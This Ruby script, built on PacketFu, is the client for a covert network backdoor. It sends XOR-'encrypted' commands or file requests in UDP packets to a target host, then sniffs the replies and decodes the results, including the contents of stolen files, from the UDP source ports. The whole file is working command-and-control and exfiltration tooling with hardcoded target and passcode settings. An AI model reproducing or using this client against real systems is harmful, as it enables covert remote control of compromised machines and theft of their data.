#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require 'socket'
include PacketFu

=begin

This client will send an encrypted packet containing a command to the backdoor.
This client will then listen for the response of that command.
It is run by entering the command "ruby client.rb [flag option] [command/filepath]".
Flag Options: "-c" for command | "-f" for file


=end


#Configurable Variables
interface = "eth0"			#The interface to send and listen for packets
$targetIP = '192.168.0.20'	#The IP of the host with the backdoor
$selfIP = '192.168.0.14'	#The IP of the client
$dport = 8505				#The destination port of the packet
$key = "$key"				#The password key for packet authentication
$fileDestination = "#{Dir.pwd}" + "/doc.txt"	#The file that saves file contents
$passcode = "5000"			#The password code for encryption
$filter = "udp and port 12345"	#The filter for capturing packets

#Non-Configurable Variables
$command = ARGV[1]
$flag = ""
$ipcfg=Utils.whoami?(:iface=>interface)
$targetMac = Utils.arp($targetIP, :iface=>interface)

#XOR encryption method
def encrypt(payload)
	encryptedPayload = ""
	pass_array = $passcode.split(//)
    	i = 0
    	payload.each_char do |c|
      	pass_char = pass_array[i]
     	xor = c.chr.ord ^ pass_char.ord
      	i+=1
	encryptedPayload += xor.chr
	      	if i == (pass_array.size - 1)
			i = 0
	      	end
  	end
	return encryptedPayload
end

#Send Encrypted Packet method
def send()

	#Determine flag based on argument
	case ARGV[0]
	when "-c" 
		$flag="c"
	when "-f"
		$flag="f"
	else
		puts "Error: No option was chosen.\n-------\nInput -c for a command option or input -f for a folder option\nfollowed by the command/file you want"
		exit 0
	end
	
	#Combine all data
	payloadCommand = $key+$flag+$command

	#Encrypt Data
	puts "Data to be encrypted is " + payloadCommand
	payloadContent = encrypt(payloadCommand)
	puts "Encrypted Data is " + payloadContent
	

	#Construct UDP packet using the values that were have grabbed
	udp_pkt=UDPPacket.new
	udp_pkt.eth_saddr=$ipcfg[:eth_saddr]
	udp_pkt.eth_daddr=$targetMac
	udp_pkt.udp_src=8000
	udp_pkt.udp_dst=$dport
	udp_pkt.ip_saddr=$selfIP
	udp_pkt.ip_daddr=$targetIP
	udp_pkt.payload=payloadContent
	
	# Recalculate the UDP packet and send it
	puts "Sending Encrypted Packet"
	udp_pkt.recalc
	udp_pkt.to_w(@interface)
	recieve(@interface)


end

#Receive method
def recieve(iface)
	puts "Capturing Response Packets"
	#Capture packets with a filter
	cap = Capture.new(:iface => iface, :start => true, :filter => $filter, :save=>true)
	$results = ""
	cap.stream.each do |p|
	pkt = Packet.parse p	
		if pkt.udp_sport.nil?
			break
		#If the packet payload contains the key then transmission ends
		elsif pkt.payload.include?($key)
			break
		else
		#Extract ASCII character from source port
		temp = (pkt.udp_sport / 500)
		puts "Recieving packet: " + temp.chr
		$results += temp.chr
		end

	end
	
	#Print the results based on flag
	case ARGV[0]
	when "-c" 		
		puts "RESULTS:"
		puts $results
	when "-f"
		file = File.new($fileDestination, "w")
		if file
			file.syswrite($results)
		else
			puts "Error: Unable to create file"
		end
	else
		puts "Error: No option was chosen."
		exit 0
	end
	
end

begin
	#Start Send Method
	send()
	rescue Interrupt
	exit 0
end
